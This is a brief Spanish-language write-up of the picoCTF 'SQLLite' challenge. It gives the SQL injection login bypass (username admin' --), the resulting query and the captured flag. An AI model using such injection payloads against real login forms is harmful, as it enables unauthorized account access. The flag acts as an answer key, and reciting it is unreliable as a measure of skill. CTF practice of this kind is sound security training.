### SQLLite
### Description 

Can you login to this website?Try to login [here](http://saturn.picoctf.net:54762/).
### Hint

- `admin` is the user you want to login as.

## Solución  1
```
usamos de los ejercicios anteiores los inyectores para nuestro username
en este caso 

username: admin' --
password: abcd
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='abcd'

le damos a inspeccionar el codigo fuente y obtenemos nuestra bandera
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

```